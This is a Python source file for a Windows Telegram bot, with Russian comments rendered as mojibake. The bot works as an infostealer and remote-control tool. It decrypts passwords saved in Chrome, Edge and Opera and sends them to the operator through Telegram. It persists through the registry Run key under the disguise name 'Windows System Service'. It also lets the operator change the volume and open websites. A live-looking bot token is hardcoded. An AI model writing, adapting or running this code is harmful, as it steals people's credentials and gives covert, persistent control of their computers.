# -*- coding: utf-8 -*-

import os
import json
import base64
import sqlite3
import shutil
import logging
import winreg
import sys
import webbrowser
from urllib.parse import urlparse

# --- –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π ---
# pip install --upgrade python-telegram-bot pypiwin32 cryptography pyautogui

# --- (–ù–û–í–û–ï) –ë–∏–±–ª–∏–æ—Ç–µ–∫–∏ –¥–ª—è –º—å—é—Ç–µ–∫—Å–∞ (–∑–∞—â–∏—Ç—ã –æ—Ç –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞) ---
import win32event
import win32api
import winerror

# --- –ë–∏–±–ª–∏–æ—Ç–µ–∫–∏ –¥–ª—è –æ—Å–Ω–æ–≤–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π ---
import pyautogui
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- –ë–∏–±–ª–∏–æ—Ç–µ–∫–∏ –¥–ª—è Telegram ---
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# --- –í–ê–®–ò –î–ê–ù–ù–´–ï (–û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –í–°–¢–ê–í–¨–¢–ï –°–í–û–ô –¢–û–ö–ï–ù!) ---
BOT_TOKEN = '7695041312:AAFMo7LpbuKm6do2rhZj8Ib4Pjwx2PPy0kA' # <-- –í–°–¢–ê–í–¨–¢–ï –í–ê–® –¢–û–ö–ï–ù –°–Æ–î–ê

# --- –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- –ì–õ–û–ë–ê–õ–¨–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï ---
STARTUP_APP_NAME = "Windows System Service" # –ò–º—è –¥–ª—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
MUTEX_NAME = "SpectraBotGlobalMutex_Vlad"   # (–ù–û–í–û–ï) –£–Ω–∏–∫–∞–ª—å–Ω–æ–µ –∏–º—è –¥–ª—è –º—å—é—Ç–µ–∫—Å–∞

# ==============================================================================
# --- –õ–û–ì–ò–ö–ê –°–ë–û–†–ê –£–ß–ï–¢–ù–´–• –î–ê–ù–ù–´–• –° –ë–†–ê–£–ó–ï–†–û–í ---
# ==============================================================================

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception as e:
        logger.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–ª–∞–≤–Ω—ã–π –∫–ª—é—á –∏–∑ {browser_path}: {e}"); return None

def decrypt_password(password, master_key):
    try:
        return AESGCM(master_key).decrypt(password[3:15], password[15:], None).decode()
    except Exception:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception: return "–ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å"

def get_browser_credentials():
    appdata = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    browser_paths = {
        "Google Chrome": os.path.join(appdata, "Google", "Chrome", "User Data"),
        "Microsoft Edge": os.path.join(appdata, "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
    }
    all_credentials = []

    for browser_name, browser_path in browser_paths.items():
        if not os.path.exists(browser_path): continue
        master_key = get_master_key(browser_path)
        if not master_key: continue
        
        profile_dirs = [d for d in os.listdir(browser_path) if d.startswith('Profile ') or d == 'Default']
        
        for profile in profile_dirs:
            login_db_path = os.path.join(browser_path, profile, "Login Data")
            if not os.path.exists(login_db_path): continue
            
            temp_db = f"temp_db_copy.db"
            shutil.copyfile(login_db_path, temp_db)
            
            conn = None
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, username, enc_password in cursor.fetchall():
                    if username and enc_password:
                        password = decrypt_password(enc_password, master_key)
                        if password != "–ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å":
                            all_credentials.append({
                                "source": f"{browser_name} ({profile})", "url": url, "login": username, "password": password
                            })
            except Exception as e: logger.error(f"–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è –ë–î –¥–ª—è {browser_name} ({profile}): {e}")
            finally:
                if conn: conn.close()
                if os.path.exists(temp_db): os.remove(temp_db)
    return all_credentials

def get_registered_sites():
    creds = get_browser_credentials()
    if not creds: return []
    sites = {urlparse(cred['url']).netloc for cred in creds if urlparse(cred['url']).netloc}
    return sorted(list(sites))

# ==============================================================================
# --- –§–£–ù–ö–¶–ò–ò –£–ü–†–ê–í–õ–ï–ù–ò–Ø –°–ò–°–¢–ï–ú–û–ô ---
# ==============================================================================
def manage_startup(add: bool):
    exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            if add:
                winreg.SetValueEx(key, STARTUP_APP_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
                return True, "–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É."
            else:
                try:
                    winreg.DeleteValue(key, STARTUP_APP_NAME)
                    return True, "–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏."
                except FileNotFoundError:
                    return True, "–°–∫—Ä–∏–ø—Ç —É–∂–µ –æ—Ç—Å—É—Ç—Å—Ç–≤–æ–≤–∞–ª –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–µ."
    except Exception as e:
        return False, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å —Ä–µ–µ—Å—Ç—Ä–æ–º: {e}"

def is_in_startup():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ) as key:
            winreg.QueryValueEx(key, STARTUP_APP_NAME)
        return True
    except FileNotFoundError:
        return False

def set_volume(level: int):
    try:
        level = max(0, min(100, level))
        pyautogui.press('volumemute'); pyautogui.press('volumemute')
        for _ in range(50): pyautogui.press('volumedown')
        for _ in range(level // 2): pyautogui.press('volumeup')
        return True, f"–ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {level}%."
    except Exception as e:
        return False, f"–ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å: {e}"

def open_website(url: str):
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        webbrowser.open(url)
        return True, f"–°—Å—ã–ª–∫–∞ `{url}` —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç–∞."
    except Exception as e:
        return False, f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É: {e}"

# ==============================================================================
# --- –õ–û–ì–ò–ö–ê –¢–ï–õ–ï–ì–†–ê–ú-–ë–û–¢–ê ---
# ==============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await show_main_menu(update, context)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, message_text=None):
    keyboard = [
        [InlineKeyboardButton("üîë –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö", callback_data='menu_data')],
        [InlineKeyboardButton("‚öôÔ∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–æ–π", callback_data='menu_system')]
    ]
    text = message_text or "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    action = query.data

    if action == 'main_menu': await show_main_menu(update, context)
    elif action == 'menu_data':
        keyboard = [
            [InlineKeyboardButton("üåê –ü–∞—Ä–æ–ª–∏ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤", callback_data='get_passwords')],
            [InlineKeyboardButton("üîç –°–∞–π—Ç—ã —Å –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏", callback_data='get_sites')],
            [InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='main_menu')]
        ]
        await query.edit_message_text("–ú–µ–Ω—é —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif action == 'menu_system':
        startup_button = (InlineKeyboardButton("üö´ –£–¥–∞–ª–∏—Ç—å –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏", callback_data='remove_startup') if is_in_startup() else InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É", callback_data='add_startup'))
        keyboard = [
            [startup_button],
            [InlineKeyboardButton("üîä –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å", callback_data='ask_volume')],
            [InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='main_menu')]
        ]
        await query.edit_message_text("–ú–µ–Ω—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–æ–π:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif action == 'get_passwords':
        await query.edit_message_text("‚è≥ –ò—â—É –ø–∞—Ä–æ–ª–∏ –≤–æ –≤—Å–µ—Ö –ø—Ä–æ—Ñ–∏–ª—è—Ö...")
        creds = get_browser_credentials()
        if not creds: await query.edit_message_text("‚úÖ –£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='menu_data')]])); return
        output = "‚úÖ **–ù–∞–π–¥–µ–Ω–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**\n\n"
        for cred in creds: output += (f" –∏—Å—Ç–æ—á–Ω–∏–∫–∞: `{cred['source']}`\n –°–∞–π—Ç: `{cred['url']}`\n –õ–æ–≥–∏–Ω: `{cred['login']}`\n –ü–∞—Ä–æ–ª—å: `{cred['password']}`\n--------------------------------\n")
        from io import BytesIO
        if len(output) > 4096:
            file = BytesIO(output.encode('utf-8')); file.name = "browser_passwords.txt"
            await context.bot.send_document(chat_id=query.message.chat_id, document=file)
            await query.edit_message_text("‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–∏–µ, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —Ñ–∞–π–ª–æ–º.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='menu_data')]]))
        else: await query.edit_message_text(output, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='menu_data')]]))
    elif action == 'get_sites':
        await query.edit_message_text("‚è≥ –ê–Ω–∞–ª–∏–∑–∏—Ä—É—é –¥–∞–Ω–Ω—ã–µ...")
        sites = get_registered_sites()
        if not sites: await query.edit_message_text("‚úÖ –°–∞–π—Ç—ã —Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è–º–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='menu_data')]])); return
        output = "‚úÖ **–ù–∞–π–¥–µ–Ω—ã –∞–∫–∫–∞—É–Ω—Ç—ã –Ω–∞ —Å–ª–µ–¥—É—é—â–∏—Ö —Å–∞–π—Ç–∞—Ö:**\n\n" + "\n".join([f"‚Ä¢ `{site}`" for site in sites])
        await query.edit_message_text(output, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='menu_data')]]))
    elif action in ['add_startup', 'remove_startup']:
        success, msg = manage_startup(add=(action == 'add_startup'))
        await query.answer(f"{'‚úÖ' if success else '‚ùå'} {msg}", show_alert=True)
        # –û–±–Ω–æ–≤–ª—è–µ–º –º–µ–Ω—é —Å–∏—Å—Ç–µ–º—ã, —á—Ç–æ–±—ã –∫–Ω–æ–ø–∫–∞ –∏–∑–º–µ–Ω–∏–ª–∞—Å—å
        query.data = 'menu_system'; await button_callback(update, context)
    elif action == 'ask_volume':
        context.user_data['next_action'] = 'set_volume'
        await query.edit_message_text("–í–≤–µ–¥–∏—Ç–µ –≥—Ä–æ–º–∫–æ—Å—Ç—å –æ—Ç 0 –¥–æ 100:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data='menu_system')]]))

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if context.user_data.get('next_action') == 'set_volume':
        context.user_data.clear()
        try:
            volume_level = int(user_input)
            success, msg = set_volume(volume_level)
            await show_main_menu(update, context, message_text=f"{'‚úÖ' if success else '‚ùå'} {msg}")
        except ValueError: await show_main_menu(update, context, message_text="‚ùå –û—à–∏–±–∫–∞: –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
        return
    success, msg = open_website(user_input)
    await update.message.reply_text(f"{'‚úÖ' if success else '‚ùå'} {msg}", parse_mode='Markdown')

def main():
    # (–ù–û–í–û–ï) –°–æ–∑–¥–∞–µ–º –º—å—é—Ç–µ–∫—Å
    mutex = win32event.CreateMutex(None, 1, MUTEX_NAME)
    # (–ù–û–í–û–ï) –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –æ–Ω —É–∂–µ
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        print("–î—Ä—É–≥–∞—è –∫–æ–ø–∏—è —Å–∫—Ä–∏–ø—Ç–∞ —É–∂–µ –∑–∞–ø—É—â–µ–Ω–∞. –í—ã—Ö–æ–¥.")
        # (–ù–û–í–û–ï) –ï—Å–ª–∏ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, –≤—ã—Ö–æ–¥–∏–º –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã
        return

    if '–í–ê–®_–ù–û–í–´–ô_–¢–û–ö–ï–ù' in BOT_TOKEN or len(BOT_TOKEN) < 40:
        print("!!! –û–®–ò–ë–ö–ê: –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—Å—Ç–∞–≤—å—Ç–µ –≤–∞—à –Ω–∞—Å—Ç–æ—è—â–∏–π BOT_TOKEN –≤ –∫–æ–¥ —Å–∫—Ä–∏–ø—Ç–∞.")
        return

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))

    print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω –∏ –∂–¥–µ—Ç –∫–æ–º–∞–Ω–¥...")
    
    # (–ù–û–í–û–ï) –û–±–æ—Ä–∞—á–∏–≤–∞–µ–º –∑–∞–ø—É—Å–∫ –≤ try...finally, —á—Ç–æ–±—ã –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –º—å—é—Ç–µ–∫—Å–∞
    try:
        application.run_polling()
    finally:
        # (–ù–û–í–û–ï) –û—Å–≤–æ–±–æ–∂–¥–∞–µ–º –º—å—é—Ç–µ–∫—Å –ø—Ä–∏ –≤—ã—Ö–æ–¥–µ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã
        win32api.CloseHandle(mutex)

if __name__ == "__main__":
    main()